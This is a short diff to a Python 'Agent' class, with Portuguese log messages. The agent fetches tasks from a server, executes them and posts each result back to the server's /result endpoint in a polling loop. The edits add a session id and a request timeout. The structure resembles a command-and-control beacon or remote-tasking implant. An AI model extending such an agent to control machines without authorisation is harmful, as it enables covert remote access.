@@ -143,7 +143,8 @@ class Agent:
     def execute_task(self, task: Dict) -> Dict:
         task_id = task.get("task_id")
         action = task.get("action", "").lower()
-        result = {"task_id": task_id, 
+        result = {"sid": self.sid,
+                  "task_id": task_id, 
                   "status": "error", 
                   "output": "", 
                   "error": ""}
@@ -195,7 +196,7 @@ if __name__ == "__main__":
             while task := agent.get_next_task():
                 print(f"[+] Executando tarefa: {task.get('action')}")
                 result = agent.execute_task(task)
-                requests.post(f"{agent.server_url}/result", json=result)
+                requests.post(f"{agent.server_url}/result", json=result, timeout=10)
                 
             time.sleep(agent.get_sleep_time())
             
